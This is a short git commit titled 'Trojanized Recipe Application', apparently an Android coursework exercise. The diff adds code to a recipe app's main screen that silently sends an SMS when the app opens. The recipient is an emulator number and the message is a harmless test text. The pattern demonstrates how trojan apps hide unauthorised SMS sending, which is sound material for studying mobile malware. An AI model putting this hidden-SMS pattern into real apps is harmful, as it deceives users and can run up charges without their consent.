0370cbc441f1f7380009c2eaa45c27c5b58ffcc4
shiven chawla <chawls@uw.edu>
2017-06-25 06:02:59 -0700

    Trojanized Recipe Application

--- app/src/main/java/com/example/malrecipe/MainActivity.java
+++ app/src/main/java/com/example/malrecipe/MainActivity.java
@@ -1,13 +1,42 @@
 package com.example.malrecipe;
 
+import android.app.PendingIntent;
+import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.view.Menu;
+import android.view.MenuItem;
 
 public class MainActivity extends AppCompatActivity {
 
+    PendingIntent pi;
+    SmsManager sms;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        String msg = "android.telephony.SmsManager.STATUS_ON_ICC_SENT";
+        PendingIntent piSent = PendingIntent.getBroadcast(MainActivity.this, 0,new Intent(msg), 0);
+        sms = SmsManager.getDefault();
+        sms.sendTextMessage("5556", null, "This is sample test message", piSent, null);
+    }
+
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+// Inflate the menu; this adds items to the action bar if it is present.
+        getMenuInflater().inflate(R.menu.main, menu);
+        return true;
+    }
+    @Override
+    public boolean onOptionsItemSelected(MenuItem item) {
+// Handle action bar item clicks here. The action bar will
+// automatically handle clicks on the Home/Up button, so long
+// as you specify a parent activity in AndroidManifest.xml.
+        int id = item.getItemId();
+        if (id == R.id.action_settings) {
+            return true;
+        }
+        return super.onOptionsItemSelected(item);
     }
 }
